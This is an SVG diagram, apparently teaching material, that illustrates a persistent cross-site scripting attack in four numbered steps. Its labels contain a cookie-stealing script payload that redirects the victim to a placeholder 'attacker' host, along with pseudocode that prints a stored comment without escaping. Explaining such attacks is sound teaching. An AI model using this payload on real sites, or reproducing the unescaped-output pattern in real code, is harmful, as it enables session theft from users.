<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->

<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   version="1.1"
   width="1072"
   height="609"
   id="svg4143"
   inkscape:version="0.48.4 r9939"
   sodipodi:docname="persistent-xss.svg">
  <metadata
     id="metadata4255">
    <rdf:RDF>
      <cc:Work
         rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type
           rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
        <dc:title></dc:title>
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <sodipodi:namedview
     pagecolor="#ffffff"
     bordercolor="#666666"
     borderopacity="1"
     objecttolerance="10"
     gridtolerance="10"
     guidetolerance="10"
     inkscape:pageopacity="0"
     inkscape:pageshadow="2"
     inkscape:window-width="1301"
     inkscape:window-height="744"
     id="namedview4253"
     showgrid="true"
     inkscape:snap-bbox="true"
     inkscape:zoom="1.4261579"
     inkscape:cx="390.11544"
     inkscape:cy="402.98534"
     inkscape:window-x="65"
     inkscape:window-y="24"
     inkscape:window-maximized="1"
     inkscape:current-layer="svg4143"
     fit-margin-top="0"
     fit-margin-left="0"
     fit-margin-right="0"
     fit-margin-bottom="0">
    <inkscape:grid
       type="xygrid"
       id="grid4257"
       empspacing="5"
       visible="true"
       enabled="true"
       snapvisiblegridlinesonly="true"
       spacingx="16px"
       spacingy="16px"
       originx="0px"
       originy="2.6171874e-06px" />
  </sodipodi:namedview>
  <defs
     id="defs4145">
    <linearGradient
       x1="0"
       y1="0"
       x2="0"
       y2="1"
       id="container-gradient">
      <stop
         id="stop3318"
         style="stop-color:hsl(0, 0%, 25%);stop-opacity:1"
         offset="0" />
      <stop
         id="stop3320"
         style="stop-color:hsl(0, 0%, 5%);stop-opacity:1"
         offset="1" />
    </linearGradient>
    <linearGradient
       x1="0"
       y1="0"
       x2="0"
       y2="1"
       id="entity-gradient">
      <stop
         id="stop3323"
         style="stop-color:hsl(0, 0%, 100%);stop-opacity:1"
         offset="0" />
      <stop
         id="stop3325"
         style="stop-color:hsl(0, 0%, 75%);stop-opacity:1"
         offset="1" />
    </linearGradient>
    <linearGradient
       x1="0"
       y1="0"
       x2="0"
       y2="1"
       id="symbol-gradient">
      <stop
         style="stop-color:hsl(220, 100%, 50%);stop-opacity:1"
         offset="0"
         id="stop4154" />
      <stop
         style="stop-color:hsl(220, 100%, 10%);stop-opacity:1"
         offset="1"
         id="stop4156" />
    </linearGradient>
    <marker
       refX="-1"
       markerWidth="3.5"
       markerHeight="3"
       orient="auto"
       viewBox="-1 -1 2.5 2"
       id="arrowhead">
      <path
         d="M -2,-1.25 -2,1.25 1.5,0 z"
         id="path3428"
         inkscape:connector-curvature="0" />
    </marker>
    <marker
       refX="-1"
       markerWidth="3.5"
       markerHeight="3"
       orient="auto"
       viewBox="-1 -1 2.5 2"
       id="arrowhead-malicious">
      <path
         d="M -2,-1.25 -2,1.25 1.5,0 z"
         id="path4161"
         inkscape:connector-curvature="0" />
    </marker>
    <style
       id="style4163">
			text {
				font-family: Ubuntu;
				font-size: 16px;
				text-align: center;
				text-anchor: middle;
			}
			
			rect.container {
				fill: url(#container-gradient);
				stroke: hsl(0, 0%, 50%);
				stroke-width: 1px;
			}
				
			text.container, text.container tspan {
				fill: white;
				font-weight: bold;
			}
			
			rect.entity {
				fill: url(#entity-gradient);
				stroke: hsl(0, 0%, 50%);
				stroke-width: 1px;
			}
			
			text.code {
				font-family: &quot;Ubuntu Mono&quot;;
			}
      
      text.left {
        text-align: left;
        text-anchor: start;
      }
			
			rect.symbol {
				fill: url(#symbol-gradient);
				stroke: hsl(0, 0%, 50%);
				stroke-width: 1px;
			}
			
			text.symbol {
				fill: white;
				font-size: 32px;
				font-weight: bold;
			}

			path.arrow {
				fill: none;
				stroke: hsl(240, 100%, 50%);
				stroke: blue;
				stroke-width: 16px;
				marker-end: url(#arrowhead);
			}
			
			marker#arrowhead {
				fill: hsl(240, 100%, 50%);
			}
			
			path.arrow.malicious {
				stroke: hsl(0, 100%, 50%);
				stroke: red;
				marker-end: url(#arrowhead-malicious);
			}
			
			marker#arrowhead-malicious {
				fill: hsl(0, 100%, 50%);
			}
			
			text.malicious, tspan.malicious {
				fill: hsl(0, 100%, 50%);
				font-weight: bold;
			}
			
			tspan.string {
				fill: hsl(220, 100%, 50%);
			}
		</style>
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4295"
       x1="272"
       y1="64"
       x2="272"
       y2="112"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4297"
       x1="272"
       y1="380.36218"
       x2="272"
       y2="428.36218"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4299"
       x1="336"
       y1="444.36218"
       x2="336"
       y2="492.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-16)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4301"
       x1="336"
       y1="380.36218"
       x2="336"
       y2="428.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-16)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4303"
       x1="272"
       y1="444.36218"
       x2="272"
       y2="492.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-16)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#container-gradient"
       id="linearGradient4898"
       x1="0"
       y1="52.181506"
       x2="0"
       y2="243.51368"
       gradientTransform="scale(1.0871146,0.91986621)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#entity-gradient"
       id="linearGradient4900"
       x1="8.425717"
       y1="183.9505"
       x2="8.425717"
       y2="275.83004"
       gradientTransform="scale(1.914157,0.52242319)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#entity-gradient"
       id="linearGradient4902"
       x1="8.3557275"
       y1="306.37667"
       x2="8.3557275"
       y2="398.28968"
       gradientTransform="scale(1.9148542,0.52223297)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#container-gradient"
       id="linearGradient4904"
       x1="0"
       y1="1075.2653"
       x2="0"
       y2="1419.1723"
       gradientTransform="matrix(1.5352989,0,0,0.65133895,0,-1)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#entity-gradient"
       id="linearGradient4906"
       x1="9.1613545"
       y1="1317.4574"
       x2="9.1613545"
       y2="1599.13"
       gradientTransform="matrix(1.7604542,0,0,0.56803522,0,-1)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#container-gradient"
       id="linearGradient4908"
       x1="431.50898"
       y1="3.3965109e-06"
       x2="431.50898"
       y2="394.5225"
       gradientTransform="matrix(1.2977714,0,0,0.77055175,0,-1)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#entity-gradient"
       id="linearGradient4910"
       x1="257.68676"
       y1="107.31694"
       x2="257.68676"
       y2="321.9508"
       gradientTransform="matrix(2.2357694,0,0,0.44727332,0,-1)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#entity-gradient"
       id="linearGradient4912"
       x1="297.44512"
       y1="309.83867"
       x2="297.44512"
       y2="557.7096"
       gradientTransform="matrix(1.9364917,0,0,0.51639778,0,-1)"
       gradientUnits="userSpaceOnUse" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4914"
       x1="272"
       y1="64"
       x2="272"
       y2="112"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-1)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4916"
       x1="272"
       y1="380.36218"
       x2="272"
       y2="428.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-1)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4918"
       x1="336"
       y1="444.36218"
       x2="336"
       y2="492.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-1)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4920"
       x1="336"
       y1="380.36218"
       x2="336"
       y2="428.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-1)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#symbol-gradient"
       id="linearGradient4922"
       x1="272"
       y1="444.36218"
       x2="272"
       y2="492.36218"
       gradientUnits="userSpaceOnUse"
       gradientTransform="translate(0,-1)" />
    <linearGradient
       inkscape:collect="always"
       xlink:href="#entity-gradient"
       id="linearGradient4924"
       x1="134.99998"
       y1="320"
       x2="134.99998"
       y2="416"
       gradientTransform="matrix(2,0,0,0.5,0,-1)"
       gradientUnits="userSpaceOnUse" />
  </defs>
  <rect
     id="rect2987"
     class="container"
     y="49.000004"
     x="0"
     ry="8"
     rx="8"
     height="176"
     width="208"
      />
  <rect
     id="rect2991-2"
     class="entity"
     y="97.100006"
     x="16.128145"
     ry="8"
     rx="8"
     height="48"
     width="175.87186"
      />
  <text
     xml:space="preserve"
     id="text3011"
     y="129"
     x="104.08582"
     class="entity"
     ><tspan
       id="tspan3013"
       y="129"
       x="104.08582">Attacker's Browser</tspan></text>
  <rect
     id="rect2991-2-4"
     class="entity"
     y="161"
     x="16"
     ry="8"
     rx="8"
     height="48"
     width="176"
      />
  <text
     xml:space="preserve"
     id="text3011-1"
     y="193"
     x="104.02175"
     class="entity"
     ><tspan
       id="tspan3013-4"
       y="193"
       x="104.02175">Attacker's Server</tspan></text>
  <text
     xml:space="preserve"
     id="text3011-1-3"
     y="81"
     x="103.999"
     class="container"
     ><tspan
       id="tspan3013-4-3"
       y="81"
       x="103.999"
       >Attacker</tspan></text>
  <g
     id="g5259"
     transform="translate(0,-315.36218)">
    <rect
       id="rect2987-7"
       class="container"
       y="700.36218"
       x="0"
       ry="8"
       rx="8"
       height="224"
       width="528"
        />
    <rect
       id="rect2991-2-2"
       class="entity"
       y="748.36218"
       x="16.128145"
       ry="8"
       rx="7.9999995"
       height="160"
       width="495.87186"
        />
    <text
       xml:space="preserve"
       id="text3011-8"
       y="780.36218"
       x="264.43469"
       class="entity"
       ><tspan
         id="tspan3013-1"
         y="780.36218"
         x="264.43469">Website's Response to Victim</tspan></text>
    <text
       xml:space="preserve"
       id="text3011-1-3-0"
       y="732.36218"
       x="263.48276"
       class="container"
       ><tspan
         id="tspan3013-4-3-8"
         y="732.36218"
         x="263.48276"
         >Victim's Browser</tspan></text>
    <text
       xml:space="preserve"
       id="text3011-8-6"
       y="812.36218"
       x="32"
       class="code left"
       ><tspan
         id="tspan3013-1-4"
         y="812.36218"
         x="32">&lt;html&gt;</tspan><tspan
         id="tspan3985"
         y="828.36218"
         x="32">Latest comment:</tspan><tspan
         class="malicious"
         id="tspan3987"
         y="844.36218"
         x="32"
         >&lt;script&gt;</tspan><tspan
         class="malicious"
         id="tspan3989"
         y="860.36218"
         x="32"
         >window.location='http://attacker/?cookie='+document.cookie</tspan><tspan
         class="malicious"
         id="tspan3991"
         y="876.36218"
         x="32"
         >&lt;/script&gt;</tspan><tspan
         id="tspan3993"
         y="892.36218"
         x="32">&lt;/html&gt;</tspan></text>
  </g>
  <g
     id="g4443"
     transform="translate(0,17)">
    <rect
       id="rect2987-7-9"
       class="container"
       y="2.6171874e-06"
       x="560"
       ry="7.9999995"
       rx="8"
       height="304"
       width="512"
        />
    <rect
       id="rect2991-2-2-6"
       class="entity"
       y="48.000004"
       x="576.12817"
       ry="8"
       rx="7.9999995"
       height="96"
       width="479.87183"
        />
    <text
       xml:space="preserve"
       id="text3011-8-61"
       y="80"
       x="816.26886"
       class="entity"
       ><tspan
         id="tspan3013-1-9"
         y="80"
         x="816.26886">Website's Database</tspan></text>
    <text
       xml:space="preserve"
       id="text3011-1-3-0-4"
       y="32.000004"
       x="816.19989"
       class="container"
       ><tspan
         id="tspan3013-4-3-8-7"
         y="32.000004"
         x="816.19989"
         >Website</tspan></text>
    <text
       xml:space="preserve"
       id="text3011-8-6-5"
       y="112"
       x="592"
       class="code left"
       ><tspan
         id="tspan3993-3"
         y="112"
         x="592">latestComment: <tspan
   id="tspan4199"
   class="malicious"
   >&lt;script&gt;window.location='http://attacker/</tspan></tspan><tspan
         class="malicious"
         xml:space="preserve"
         id="tspan4051"
         y="128"
         x="592"
         >               ?cookie='+document.cookie&lt;/script&gt;</tspan></text>
    <rect
       id="rect2991-2-2-6-1"
       y="160"
       x="576"
       ry="8"
       rx="7.9999995"
       height="128"
       width="480"
       class="entity"
        />
    <text
       xml:space="preserve"
       id="text3011-8-61-0"
       y="192"
       x="815.65277"
       class="entity"
       ><tspan
         id="tspan3013-1-9-9"
         y="192"
         x="815.65277">Website's Response Script</tspan></text>
    <text
       xml:space="preserve"
       id="text3011-8-6-5-7"
       y="224"
       x="590.86401"
       class="code left"
       ><tspan
         id="tspan4051-4"
         y="224"
         x="590.86401">print <tspan
   id="tspan4207"
   class="string">&quot;&lt;html&gt;&quot;</tspan></tspan><tspan
         id="tspan4189"
         y="240"
         x="590.86401">print <tspan
   id="tspan4210"
   class="string">&quot;Latest comment:&quot;</tspan></tspan><tspan
         id="tspan4191"
         y="256"
         x="590.86401">print database.latestComment</tspan><tspan
         id="tspan4193"
         y="272"
         x="590.86401">print <tspan
   id="tspan4214"
   class="string">&quot;&lt;/html&gt;&quot;</tspan></tspan></text>
  </g>
  <path
     inkscape:connector-curvature="0"
     id="path3426"
     d="m 192,121 328,0"
     class="arrow"
      />
  <g
     id="g4717"
     transform="translate(5.99999,-283.36218)">
    <g
       id="g3727"
       transform="translate(64,-96)">
      <rect
         id="rect3601"
         class="symbol"
         transform="translate(0,316.36218)"
         y="64"
         x="272"
         ry="8"
         rx="8"
         height="48"
         width="48"
          />
      <text
         xml:space="preserve"
         id="text3603"
         y="415.45016"
         x="297.52576"
         class="symbol"
         ><tspan
           id="tspan3605"
           y="415.45016"
           x="297.52576">1</tspan></text>
      <rect
         id="rect3601-8"
         class="symbol"
         y="380.36218"
         x="272"
         ry="8"
         rx="8"
         height="48"
         width="48"
          />
      <text
         xml:space="preserve"
         id="text3603-2"
         y="415.45016"
         x="296"
         class="symbol"
         ><tspan
           id="tspan3605-4"
           y="415.45016"
           x="296">1</tspan></text>
    </g>
    <text
       xml:space="preserve"
       id="text4713"
       y="364.36218"
       x="359.45874"
       ><tspan
         id="tspan4715"
         y="364.36218"
         x="359.45874">POST http://website/post-comment</tspan></text>
  </g>
  <g
     id="g3495"
     transform="translate(16,-291.36218)">
    <g
       id="g3745"
       transform="translate(-320,128)">
      <rect
         id="rect3601-8-1-6-0"
         class="symbol"
         y="444.36218"
         x="336"
         ry="8"
         rx="8"
         height="48"
         width="48"
          />
      <text
         xml:space="preserve"
         id="text3603-2-0-2-6"
         y="479.45016"
         x="360"
         class="symbol"
         ><tspan
           id="tspan3605-4-9-4-5"
           y="479.45016"
           x="360">4</tspan></text>
    </g>
    <text
       class="left"
       xml:space="preserve"
       id="text4713-9"
       y="604.36218"
       x="112"
       ><tspan
         id="tspan4715-2"
         y="604.36218"
         x="112">GET http://attacker/?cookie=<tspan
   id="tspan4234"
   class="malicious"
   >sensitive-data</tspan></tspan></text>
  </g>
  <path
     inkscape:connector-curvature="0"
     id="path3426-0"
     d="m 104,385 0,-120"
     class="arrow malicious"
      />
  <path
     inkscape:connector-curvature="0"
     id="path3426-05"
     d="m 528,489 344,0 0,-128"
     class="arrow"
      />
  <path
     inkscape:connector-curvature="0"
     id="path3426-05-7"
     d="m 920,305 0,232 -352,0"
     class="arrow"
      />
  <g
     id="g5237"
     transform="translate(-11.999989,-299.36218)">
    <g
       id="g3735"
       transform="translate(347.99999,304)">
      <rect
         id="rect3601-8-1"
         class="symbol"
         y="380.36218"
         x="336"
         ry="8"
         rx="8"
         height="48"
         width="48"
          />
      <text
         xml:space="preserve"
         id="text3603-2-0"
         y="415.45016"
         x="360"
         class="symbol"
         ><tspan
           id="tspan3605-4-9"
           y="415.45016"
           x="360">2</tspan></text>
    </g>
    <text
       xml:space="preserve"
       id="text4713-9-8"
       y="764.36218"
       x="707.68274"
       ><tspan
         id="tspan4715-2-5"
         y="764.36218"
         x="707.68274">GET http://website/latest-comment</tspan></text>
  </g>
  <g
     id="g5251"
     transform="translate(2.1453818,-299.36218)">
    <g
       id="g3740"
       transform="translate(672,240)">
      <rect
         id="rect3601-8-1-6"
         class="symbol"
         y="444.36218"
         x="272"
         ry="8"
         rx="8"
         height="48"
         width="48"
          />
      <text
         xml:space="preserve"
         id="text3603-2-0-2"
         y="479.45016"
         x="296"
         class="symbol"
         ><tspan
           id="tspan3605-4-9-4"
           y="479.45016"
           x="296">3</tspan></text>
    </g>
    <text
       xml:space="preserve"
       id="text4713-9-86"
       y="764.12219"
       x="967.59924"
       ><tspan
         id="tspan4715-2-8"
         y="764.12219"
         x="967.59924">200 OK</tspan></text>
  </g>
  <g
     id="g4629"
     transform="translate(0,-63)">
    <rect
       id="rect2991-2-2-6-4"
       class="entity"
       y="160"
       x="269.99997"
       ry="8"
       rx="8"
       height="48"
       width="192"
        />
    <text
       xml:space="preserve"
       id="text3011-8-6-5-3"
       y="192"
       x="445.27997"
       class="code malicious"
       ><tspan
         id="tspan3993-3-1"
         y="192"
         x="365.96796">&lt;script&gt;...&lt;/script&gt;</tspan></text>
  </g>
</svg>
